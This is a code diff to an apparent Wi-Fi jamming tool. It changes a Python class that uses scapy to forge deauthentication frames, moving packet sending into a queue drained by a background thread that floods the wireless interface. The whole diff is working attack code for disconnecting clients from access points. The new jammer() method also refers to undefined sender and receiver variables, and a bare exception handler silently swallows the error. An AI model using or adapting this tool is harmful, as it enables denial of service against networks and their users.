@@ -24,7 +24,7 @@ from scapy.layers.eap   import EAPOL
 class JAMMER:
 
 	__ACCESSPOINTS = []
-	LOCK = threading.Semaphore(value=1)
+	__FORGERS      = []
 
 	def __init__(self, prs):
 		self.interface = prs.interface
@@ -77,28 +77,26 @@ class JAMMER:
 			self.forge(receiver, sender)
 		)
 
-		self.LOCK.acquire()
-		for pkt in pkts:
-			sendp(
-				pkt,
-				iface=self.interface,
-				count=self.packets,
-				verbose=False
-			)
-			time.sleep(1)
-		self.LOCK.release()
+		self.__FORGERS.append(pkts)
+		#for pkt in pkts:
+		#	sendp(
+		#		pkt,
+		#		iface=self.interface,
+		#		count=self.packets,
+		#		verbose=False
+		#	)
 			
-		essid = self.get_ess(sender, receiver)
-		pull.print("*",
-			"Sent Deauths Count [{count}] Code [{code}] {sender} -> {receiver} ({essid})".format(
-				count=pull.RED+str(self.packets)+pull.END,
-				code =pull.GREEN+str(self.code)+pull.END,
-				sender=pull.DARKCYAN+sender.upper().replace(":", "")+pull.END,
-				receiver=pull.DARKCYAN+receiver.upper().replace(":", "")+pull.END,
-				essid=essid
-			),
-			pull.YELLOW
-		)
+		#essid = self.get_ess(sender, receiver)
+		#pull.print("*",
+		#	"Sent Deauths Count [{count}] Code [{code}] {sender} -> {receiver} ({essid})".format(
+		#		count=pull.RED+str(self.packets)+pull.END,
+		#		code =pull.GREEN+str(self.code)+pull.END,
+		#		sender=pull.DARKCYAN+sender.upper().replace(":", "")+pull.END,
+		#		receiver=pull.DARKCYAN+receiver.upper().replace(":", "")+pull.END,
+		#		essid=essid
+		#	),
+		#	pull.YELLOW
+		#)
 
 	def deauthenticate(self, sender, receiver):
 		if self.aps and self.stations and self.filters:
@@ -167,6 +165,38 @@ class JAMMER:
 
 			self.deauthenticate(sender, receiver)
 
+	def jammer(self):
+		while True:
+			try:
+
+				pkts = self.__FORGERS[0]
+				del self.__FORGERS[0]
+
+				for pkt in pkts:
+					sendp(
+						pkt,
+						iface=self.interface,
+						count=self.packets,
+						verbose=False
+					)
+					time.sleep(0.5)
+
+				essid = self.get_ess(sender, receiver)
+				pull.print("*",
+					"Sent Deauths Count [{count}] Code [{code}] {sender} -> {receiver} ({essid})".format(
+						count=pull.RED+str(self.packets)+pull.END,
+						code =pull.GREEN+str(self.code)+pull.END,
+						sender=pull.DARKCYAN+sender.upper().replace(":", "")+pull.END,
+						receiver=pull.DARKCYAN+receiver.upper().replace(":", "")+pull.END,
+						essid=essid
+					),
+					pull.YELLOW
+				)
+				time.sleep(self.delay)
+
+			except Exception as e:
+				pass
+
 	def hopper(self, chs):
 		if type(chs) == tuple:
 			ch = random.choice(chs)
@@ -183,6 +213,10 @@ class JAMMER:
 
 	def engage(self):
 		t = threading.Thread(target=self.hopper, args=(self.channel,))
+		t.daemon = True
+		t.start()
+
+		t = threading.Thread(target=self.jammer)
 		t.daemon = True
 		t.start()
 
